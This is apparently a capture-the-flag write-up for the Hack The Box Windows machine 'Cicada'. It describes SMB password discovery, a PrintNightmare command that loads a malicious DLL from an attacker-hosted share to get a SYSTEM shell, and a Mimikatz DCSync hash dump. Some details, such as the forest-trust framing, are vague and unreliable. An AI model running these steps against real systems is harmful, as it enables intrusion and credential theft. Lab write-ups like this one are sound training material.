---
title: "HTB: Cicada"
tags: [htb, windows, medium, forest-trust, printnightmare, smb]

description: "Abusing Forest Trusts and data mining SMB shares to compromise a child domain."
---

# Hack The Box: Cicada

**Machine IP**: `10.10.11.x`
**OS**: Windows
**Difficulty**: Medium

Cicada involves a child domain controller and exploiting trusts.

## 1. Reconnaissance
Anonymous SMB access leads to a password in a script: `cycle.passwd`.
User: `cicada\john`.

## 2. Enumeration
John has access to internal shares. We find a document mentioning "Development/Production" passwords.
We check for **PrintNightmare** (CVE-2021-1675). The spooler service is running.

## 3. Exploitation (PrintNightmare)
We use a python implementation of PrintNightmare to load a malicious DLL.
```bash
python3 CVE-2021-1675.py cicada/john:password@10.10.11.x '\\10.10.14.14\share\evil.dll'
```
We get a System shell.

## 4. Forest Domination
Inside the box, we perform **Snooping**.
We verify trusts: `nltest /domain_trusts`.
We steal the NTLM hash of the machine account.
We use **Mimikatz** to perform a DCSync attack, dumping the hashes of all users in the specific domain.

## Conclusion
A mix of weak file permissions (passwords in scripts) and the devastating PrintNightmare exploit.
